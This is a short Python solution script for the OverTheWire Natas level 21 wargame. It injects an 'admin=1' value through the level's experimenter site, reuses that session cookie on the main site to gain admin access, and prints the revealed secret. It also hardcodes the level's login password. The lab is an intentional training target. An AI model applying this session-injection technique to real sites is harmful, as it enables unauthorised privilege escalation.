import requests
from bs4 import BeautifulSoup

username='natas21'
password='IFekPyrQXftziDEsUr3x21sYuahypdgJ'
url ="http://{}.natas.labs.overthewire.org/".format(username) #?debug=True
url1 = "http://{}-experimenter.natas.labs.overthewire.org/?debug=true".format(username)
s = requests.Session()

r = s.post(url1,data={'submit':'test','admin':'1'},auth=(username,password))
d = s.post(url,cookies={'PHPSESSID':r.cookies['PHPSESSID']},auth=(username,password))

sp = BeautifulSoup(d.text,'lxml')
pre = sp.find_all("pre")


print(pre[0].text)